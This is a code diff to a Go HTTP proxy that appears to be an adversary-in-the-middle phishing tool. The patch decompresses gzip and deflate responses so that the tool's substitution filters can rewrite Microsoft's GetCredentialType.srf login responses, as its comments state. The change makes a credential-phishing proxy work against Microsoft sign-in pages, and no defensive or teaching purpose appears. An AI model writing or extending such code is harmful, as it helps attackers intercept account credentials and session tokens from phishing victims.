@@ -10,6 +10,8 @@ package core
 import (
 	"bufio"
 	"bytes"
+	"compress/flate"
+	"compress/gzip"
 	"crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
@@ -1098,7 +1100,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// modify received body
+			// Decompress gzip/deflate/br bodies so sub_filters can do text replacement.
+			// Without this, Microsoft's GetCredentialType.srf (and others) arrive
+			// gzip-compressed and the FederationRedirectUrl search never matches.
+			contentEncoding := strings.ToLower(resp.Header.Get("Content-Encoding"))
 			body, err := ioutil.ReadAll(resp.Body)
+			if err == nil && len(body) > 0 {
+				switch contentEncoding {
+				case "gzip":
+					if gr, gerr := gzip.NewReader(bytes.NewReader(body)); gerr == nil {
+						if decompressed, derr := ioutil.ReadAll(gr); derr == nil {
+							body = decompressed
+							resp.Header.Del("Content-Encoding")
+						}
+						gr.Close()
+					}
+				case "deflate":
+					fr := flate.NewReader(bytes.NewReader(body))
+					if decompressed, derr := ioutil.ReadAll(fr); derr == nil {
+						body = decompressed
+						resp.Header.Del("Content-Encoding")
+					}
+					fr.Close()
+				case "br":
+					// brotli not in stdlib; skip decompression but log it
+					log.Debug("response body is brotli-compressed, sub_filters may not apply: %s", resp.Request.URL)
+				}
+			}
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
